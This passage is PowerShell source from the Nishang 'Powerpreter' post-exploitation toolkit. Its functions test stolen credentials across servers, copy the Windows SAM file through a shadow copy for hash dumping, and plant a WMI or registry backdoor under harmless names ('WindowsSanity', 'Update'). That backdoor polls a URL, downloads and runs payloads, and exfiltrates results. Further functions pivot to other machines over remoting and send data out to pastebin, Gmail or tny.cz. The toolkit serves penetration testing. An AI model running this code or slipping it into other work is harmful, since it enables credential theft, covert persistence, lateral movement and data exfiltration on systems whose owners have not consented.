Above command uses the credentials available with current powershell session and checks it against multiple computers specified in servers.txt

.EXAMPLE
PS > Create-MultipleSessions -filename .\servers.txt -Creds
Above command asks the user to provide username and passowrd to check on remote computers.

.EXAMPLE
PS > Create-MultipleSessions -filename .\servers.txt -CreateSessions
Above command uses the credentials available with current powershell session, checks it against multiple computers specified in servers.txt and creates PSSession for those.

.LINK
http://labofapenetrationtester.blogspot.com/2013/04/poshing-the-hashes.html
http://code.google.com/p/nishang
#>

    Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $filename,
    [Switch] $Creds,
    [Switch] $CreateSessions,
    [Switch] $VerboseErrors)

    $ErrorActionPreference = "SilentlyContinue"
    if ($VerboseErrors)
    {
        $ErrorActionPreference = "Continue"
    }
    $servers = Get-Content $filename

    if ($Creds)
    {
        $Credentials = Get-Credential
        $CheckCommand = 'gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True" -ComputerName $server -Credential $Credentials'
        $SessionCommand = 'New-PSSession -ComputerName $server -Credential $Credentials'
    }

    else
    {
        $CheckCommand = 'gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True" -ComputerName $server'
        $SessionCommand = 'New-PSSession -ComputerName $server'
    }

    foreach ($server in $servers)
    {
       $check = Invoke-Expression $CheckCommand
       if($check -ne $null)
       {
           Write-Host "Credentials worked on $server !!" -ForegroundColor Green
           if ($CreateSessions -eq $True)
           {
                "`nCreating Session for $server"
                Invoke-Expression $SessionCommand
           }
        }
        else
        {
           "Could not connect or credentials didn't work on $server"
        }
    }
    
    if ($CreateSessions -eq $True)
    {
    Write-Host "`nFollowing Sessions have been created: " -ForegroundColor Green
    Get-PSSession
    }
}

function Copy-VSS
{
<#
.SYNOPSIS
Nishang Payload which copies the SAM file.

.DESCRIPTION
This payload uses the VSS service (starts it if not running), creates a shadow of C: 
and copies  the SAM file which could be used to dump password hashes from it. This must be run from an elevated shell.

.PARAMETER PATH
The path where SAM file would be saved. The folder must exist already.

.EXAMPLE
PS > Copy-VSS
Saves the SAM file in current run location of the payload.

.Example
PS > Copy-VSS -path C:\temp\SAM

.LINK
http://www.canhazcode.com/index.php?a=4
http://code.google.com/p/nishang

.NOTES
Code by @al14s

#>

    Param( [Parameter(Position = 0, Mandatory = $True)] [String] $Path)
    
    $service = (Get-Service -name VSS)
    if($service.Status -ne "Running")
    {
        $notrunning=1
        $service.Start()
    }
    $id = (gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
    $volume = (gwmi win32_shadowcopy -filter "ID='$id'")
    `cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SAM" $path\SAM` 
    $volume.Delete()
    if($notrunning -eq 1)
    {
        $service.Stop()
    } 
}



########################################################Achieve persistence ###############################################
###http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript.aspx

function Persistence
{
<#
.SYNOPSIS
Function which could be used to add reboot persistence to powerpreter.

.DESCRIPTION
Powerpreter is dropped into the user's temp directory (with name Update.psm1) and either WMI permanent event consumer or Registry changes is used (based on privs) for persistence.
The Update.psm1 is then copied to $PSModulepath of the user.
Persistence created using this function could be cleaned by using the Remove-Persistence function.

.PARAMETER CheckURL
The URL which the payload would query for instructions.

.PARAMETER PayloadURL
The URL from where the powershell script would be downloaded.

.PARAMETER MagicString
The string which would act as an instruction to the payload to proceed with download and execute.

.PARAMETER StopString
The string which if found at CheckURL will stop the payload.

.PARAMETER persist
Use this parameter to achieve reboot persistence. Different methods of persistence with Admin access and normal user access.

.PARAMETER exfil
Use this parameter to use exfiltration methods for returning the results.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for tinypaste.
Unused for gmail option.

.PARAMETER username
Username for the pastebin account where data would be pasted.
Username for the tinypaste account where data would be pasted.
Username for the gmail account where attachment would be sent as an attachment.

.PARAMETER password
Password for the pastebin account where data would be pasted.
Password for the tinypaste account where data would be pasted.
Password for the gmail account where data would be sent.

.PARAMETER keyoutoption
The method you want to use for exfitration of data.
"0" for displaying on console
"1" for pastebin.
"2" for gmail
"3" for tinypaste   

.Example
PS > Persistence
The payload will ask for all required options.

.Example
PS > Persistence -exfil
Use above command for using exfiltration methods.


.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript.aspx
#>

    
    [CmdletBinding(DefaultParameterSetName="noexfil")]
    Param([Parameter(Parametersetname="exfil")] [Switch] $exfil,
    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$PayloadURL,
    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$MagicString,
    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
    [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
    [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")] [String]$username,
    [Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")] [String]$password,
    [Parameter(Position = 7, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
    $backdoorcode = @' 
function Persistence_HTTP ($CheckURL, $PayloadURL, $MagicString, $StopString, $dev_key, $username, $password, $keyoutoption, $exfil) 
{
    while($true)
    {
    $exec = 0
    start-sleep -seconds 5
    $webclient = New-Object System.Net.WebClient
    $filecontent = $webclient.DownloadString("$CheckURL")
    if($filecontent -eq $MagicString)
    {
        $webclient = New-Object System.Net.WebClient
        $file1 = "$env:temp\payload.ps1"
        $webclient.DownloadFile($PayloadURL,"$file1")
        $pastevalue = Invoke-Expression $file1
        $exec++
        if ($exfil -eq $True)
        {
           $pastename = $env:COMPUTERNAME + " Results of Persistence: "
           Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
        }
        if ($exec -eq 1)
        {
            Start-Sleep -Seconds 60
        }
    }
    elseif ($filecontent -eq $StopString)
    {
        break
    }
    }
}
'@


    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
    if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
    {
        $filterNS = "root\cimv2"
        $wmiNS = "root\subscription"
        $query = @"
         Select * from __InstanceCreationEvent within 3 
         where targetInstance isa 'Win32_LogonSession' 
"@
        $filterName = "WindowsSanity"
        $scriptpath = $env:TEMP
        $scriptFileName = "$scriptpath\$name"
        $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
        $consumerPath = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wmiNS -Arguments @{name="WindowsSanity"; ScriptFileName=$scriptFileName; ScriptingEngine="VBScript"}
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
        echo "Set objShell = CreateObject(`"Wscript.shell`")" > "$env:temp\persist.vbs"
        echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\persist.ps1`")" >> "$env:temp\persist.vbs"
        $powerpreterpath =  $MyInvocation.MyCommand.Module.Path
        Copy-Item $powerpreterpath -Destination $env:TEMP\Update.psm1
        $options = "Persistence_HTTP  $CheckURL $PayloadURL $MagicString $StopString"
        if ($exfil -eq $True)
        {
            $options = "Persistence_HTTP $CheckURL $PayloadURL $MagicString $StopString $dev_key $username $password $keyoutoption $exfil"
        }
        echo "mkdir `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update(x64)`", `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update`", `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\UpdateCheck`"" > "$env:temp\persist.ps1"
        echo "`$currentpath = `"$env:temp\Update.psm1`"" >> "$env:temp\persist.ps1"
        echo "Copy-Item `$currentpath -Destination `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update`"" >> "$env:temp\persist.ps1"
        Out-File -InputObject $backdoorcode -Append "$env:TEMP\persist.ps1"
        Out-File -InputObject $options -Append "$env:TEMP\persist.ps1"
    }
    else
    {
        New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value "$($env:temp)\persist.vbs" -force
        $powerpreterpath =  $MyInvocation.MyCommand.Module.Path
        Copy-Item -path $powerpreterpath -Destination $env:TEMP\Update.psm1
        $options = "Persistence_HTTP  $CheckURL $PayloadURL $MagicString $StopString"
        if ($exfil -eq $True)
        {
            $options = "Persistence_HTTP $CheckURL $PayloadURL $MagicString $StopString $dev_key $username $password $keyoutoption $exfil"
        }
        echo "mkdir `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update(x64)`", `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update`", `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\UpdateCheck`"" > "$env:temp\persist.ps1"
        echo "`$currentpath = `"$env:temp\Update.psm1`"" >> "$env:temp\persist.ps1"
        echo "Copy-Item `$currentpath -Destination `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update`"" >> "$env:temp\persist.ps1"
        Out-File -InputObject $backdoorcode -Append "$env:TEMP\persist.ps1"
        Out-File -InputObject $options -Append "$env:TEMP\persist.ps1"
        echo "Set objShell = CreateObject(`"Wscript.shell`")" > "$env:temp\persist.vbs"
        echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\persist.ps1`")" >> "$env:temp\persist.vbs"
    } 
}


########################################################## Clear Persistence ##############################################################
function Remove-Persistence
{
 <#
.SYNOPSIS
Function which could be used to clear the persistence added by backdoors and keylogger.

.DESCRIPTION
This function cleans WMI events and Registry keys added by various payloads and Add-persistence script of Nishang.
Run the function as an Administrator to remove the WMI events.

.Example
PS > Remove-Persistence

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript.aspx
#>
    Param( [Parameter(Position = 0)] [Switch] $remove)

    if ($remove -eq $true)
    {
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true)
        {    
            Write-Warning "Run the Command as an Administrator. Removing Registry keys only."
            Remove-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -ErrorAction SilentlyContinue
            Break
        }

        Write-Output "Removing the WMI Events."
        $filterName = "WindowsSanity"
        gwmi __eventFilter -namespace root\subscription -filter "name='WindowsSanity'"| Remove-WmiObject
        gwmi activeScriptEventConsumer -Namespace root\subscription | Remove-WmiObject
        gwmi __filtertoconsumerbinding -Namespace root\subscription -Filter "Filter = ""__eventfilter.name='WindowsSanity'"""  | Remove-WmiObject
        Write-Output "Removing the Registry keys."
        Remove-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -ErrorAction SilentlyContinue
    }
    $Regkey = Get-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -name Update -ErrorAction SilentlyContinue
    $wmi_1 = gwmi __eventFilter -namespace root\subscription -filter "name='WindowsSanity'"
    $wmi_2 = gwmi activeScriptEventConsumer -Namespace root\subscription
    $wmi_3 = gwmi __filtertoconsumerbinding -Namespace root\subscription -Filter "Filter = ""__eventfilter.name='WindowsSanity'"""
    if ($Regkey -ne $null )
    {
        Write-Warning "Run Registry key persistence found. Use with -Remove option to clean."
    }
    elseif (($wmi_1) -and ($wmi_2) -and ($wmi_3) -ne $null)    
    {
        Write-Warning "WMI permanent event consumer persistence found. Use with -Remove option to clean."
    }
    else
    {
        Write-Output "No Persistence found."
    }
}


#########################################################Pivoting to other systems##########################################################
function Pivot
{

<#
.SYNOPSIS
Function which provides pivoting to other machines in a network.

.DESCRIPTION
The functionality uses powershell remoting to connect to remote machines. Pivoting could be interactive or non-interactive.
Credentials are required to use this function. Username/pass or a shell with rights to access remote machines could be used as credentials.

.PARAMETER Computer
Name of the computer(s) to connect to. 

.PARAMETER User
Username to be used to connect to the target (optional).

.PARAMETER Pass
Password to be used to connect to the target (optional).

.PARAMETER cmd
Cmd to be executed on the target. Mandatory in case of non-interactive.

.PARAMETER Non_Interactive
If specified, the pivtoing is non-interactive. It is interactive by default.

.EXAMPLE
PS > Pivot -Computer <target>
Above command uses the credentials available with current powershell session (or other shell) to connect to target.
It creates PSSsessions. Use Use-Session to interact with the created sessions.

.EXAMPLE
PS > Pivot -Computer <Get-Content .\targets.txt> -User Administrator -Pass P@ssword123#  
Above command asks the user to provide username and passowrd and creates PSSessions. Use Use-Session to
interact with the created sessions.

PS > Pivot -Computer <target> -cmd Get-Process -Non_Interactive
Above command uses the credentials available with current powershell session (or other shell) to connect to target.
It provides a non-interactive pivot. Get-Process is executed on the target.

.EXAMPLE
PS > Pivot -Computer <target> -User Administrator -Pass P@ssword123# -cmd Get-Process 
Above command asks the user to provide username and passowrd and creates PSSessions.
Get-Process is executed on the target. Use Use-Session to interact with the created sessions.

.LINK
http://code.google.com/p/nishang
#>



    Param ( [Parameter(Position = 0, Mandatory = $True)] [String[]] $Computer,
        [Parameter(Position = 1)] [String] $User,
        [Parameter(Position = 2)] [String] $Pass,
        [Parameter(Position = 3)] [String] $cmd,
        [Switch] $Non_Interactive)

    #Interactive pivoting
    if ($Non_Interactive -eq $false)
    {
        if ($User)
        {
            $Passwd = ConvertTo-SecureString $Pass -AsPlainText -Force
            $Creds = New-Object System.Management.Automation.PSCredential ($User, $Passwd)
            foreach ($comp in $Computer)
            {

                New-PSSession -ComputerName $comp -Credential $Creds
            }

        }
        else
        {
            New-PSSession -ComputerName $Computer

        }
    }
    #Non-Interactive pivoting (command execution on remote machines) using Invoke-Command
    if ($Non_Interactive -eq $true)
    {
    if ($User)
        {
            
            $Passwd = ConvertTo-SecureString $Pass -AsPlainText -Force
            $Creds = New-Object System.Management.Automation.PSCredential ($User, $Passwd)
            $sb = [scriptblock]::Create($cmd)
            foreach ($comp in $Computer)
            {
                $result = Invoke-Command -ComputerName $comp -Credential $Creds -ScriptBlock $sb
                "Output of command on $comp " + $result
            }
        }
        else
        {
            foreach ($comp in $Computer)
            {
                Invoke-Command -ComputerName $comp -ScriptBlock {$Command}
            }
            
        }
    }
    
}

function Use-Session
{
<#
.SYNOPSIS
Function which could be used to interact with sessions created using Pivot.

.DESCRIPTION
The functionality allows to interact with sessions created using the Pivot function. Use Get-PSSSession to
list the sessions created using Pivot.

.PARAMETER id
ID of the session to interact with. 

.EXAMPLE
PS > Use-Session -id <id>
Above command uses the credentials available with current powershell session (or other shell) to connect to target.
It creates PSSsessions. Use Use-Session to interact with the created sessions.

.LINK
http://code.google.com/p/nishang
#>
Param ( [Parameter(Position = 0, Mandatory = $True)] $id)

    while($cmd -ne "exit")
    {
        $sess = Get-PSSession -Id $id
        $computername = $sess.ComputerName
        write-host -NoNewline "$computername> "
        $cmd = read-host
        $sb = [scriptblock]::Create($cmd)
        Invoke-Command -ScriptBlock $sb -Session $sess
    }
}


#####################################################Exfiltration Functionality################################################

    function Do-Exfiltration($pastename,$pastevalue,$username,$password,$dev_key,$keyoutoption,$filename)
    {
        Write-Host "`n`n`n`n`n"
        function post_http($url,$parameters) 
        { 
            $http_request = New-Object -ComObject Msxml2.XMLHTTP 
            $http_request.open("POST", $url, $false) 
            $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
            $http_request.setRequestHeader("Content-length", $parameters.length); 
            $http_request.setRequestHeader("Connection", "close") 
            $http_request.send($parameters) 
            $script:session_key=$http_request.responseText 
        } 

        function Get-MD5()
        {
            #http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell
            $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
            $utf8 = new-object -TypeName System.Text.UTF8Encoding
            $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($password))).Replace("-", "").ToLower()
            return $hash
        }

        if ($keyoutoption -eq "0")
        {
            $pastevalue
        }

        elseif ($keyoutoption -eq "1")
        {
            $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($pastevalue)
            $pastevalue = [System.Convert]::ToBase64String($utfbytes)
            post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
            post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
        }
        
        elseif ($keyoutoption -eq "2")
        {
            #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
            $smtpserver = “smtp.gmail.com”
            $msg = new-object Net.Mail.MailMessage
            $smtp = new-object Net.Mail.SmtpClient($smtpServer )
            $smtp.EnableSsl = $True
            $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
            $msg.From = “$username@gmail.com”
            $msg.To.Add(”$username@gmail.com”)
            $msg.Subject = $pastename
            $msg.Body = $pastevalue
            if ($filename)
            {
                $att = new-object Net.Mail.Attachment($filename)
                $msg.Attachments.Add($att)
            }
            $smtp.Send($msg)
        }

        elseif ($keyoutoption -eq "3")
        {
            
            $hash = Get-MD5
            post_http "http://tny.cz/api/create.xml" "paste=$pastevalue&title=$pastename&is_code=0&is_private=1&password=$dev_key&authenticate=$username`:$hash"
        }

    }

